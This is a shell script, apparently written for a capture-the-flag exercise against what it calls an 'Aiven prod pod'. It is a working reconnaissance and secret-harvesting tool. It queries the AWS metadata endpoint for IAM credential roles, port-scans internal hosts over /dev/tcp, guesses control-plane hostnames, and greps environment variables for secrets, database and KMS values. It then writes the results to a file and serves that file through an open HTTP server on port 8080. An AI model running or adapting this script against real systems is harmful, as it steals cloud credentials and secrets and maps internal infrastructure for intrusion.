#!/bin/sh
# CTF falcon — Aiven prod pod: network + control plane + internal sandbox IP
{
  echo "=== POD ==="
  id
  hostname
  echo "--- interfaces ---"
  (ifconfig 2>/dev/null || ip -o -4 addr 2>/dev/null) | grep -E "inet|^[0-9]"
  echo "--- routes ---"
  (ip route 2>/dev/null || cat /proc/net/route) | head
  echo "--- AWS metadata (instance + role) ---"
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/hostname 2>/dev/null; echo
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null; echo
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; echo
  curl -s --max-time 4 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null; echo
  echo "=== INTERNAL SANDBOX 10.1.47.111 (real PG 5432) ==="
  for p in 5432 12691 21911 9443; do
    timeout 3 bash -c "echo > /dev/tcp/10.1.47.111/$p" 2>/dev/null && echo "$p OPEN"
  done
  echo "=== SANDBOX public 132.145.163.127 (mock 12691) ==="
  timeout 3 bash -c "echo > /dev/tcp/132.145.163.127/12691" 2>/dev/null && echo "12691 OPEN"
  echo "=== Aiven control plane discovery ==="
  for h in aiven-api api.aiven.internal control-plane console internal-api; do
    getent hosts $h >/dev/null 2>&1 && echo "DNS: $h -> $(getent hosts $h)"
  done
  echo "=== env (secrets/config) ==="
  env | grep -iE "aiven|secret|db|postgres|pg|kms|url|host" | grep -viE "path|shell|term" | head -25
  echo "=== END ==="
} > /tmp/out.txt 2>&1
python3 - <<'PY'
import http.server, socketserver, os
class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = self.path.lstrip('/')
        f = '/tmp/out.txt' if p in ('','ctf.txt','out.txt') else '/tmp/out.txt'
        try:
            b = open(f,'rb').read()
        except: b = b'notready'
        self.send_response(200); self.send_header('Content-Type','text/plain'); self.end_headers()
        self.wfile.write(b)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
socketserver.ThreadingTCPServer(('',8080),H).serve_forever()
PY
